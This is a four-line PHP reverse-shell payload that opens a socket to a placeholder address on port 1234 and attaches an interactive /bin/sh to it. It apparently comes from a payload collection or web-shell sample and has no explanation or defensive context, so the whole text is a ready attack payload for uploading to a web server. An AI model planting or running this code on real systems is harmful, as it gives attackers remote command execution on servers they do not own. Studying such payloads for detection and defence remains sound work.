<?php 
$sock=fsockopen("x.x.x.x",1234); 
exec("/bin/sh -i <&3 >&3 2>&3"); 
?> 
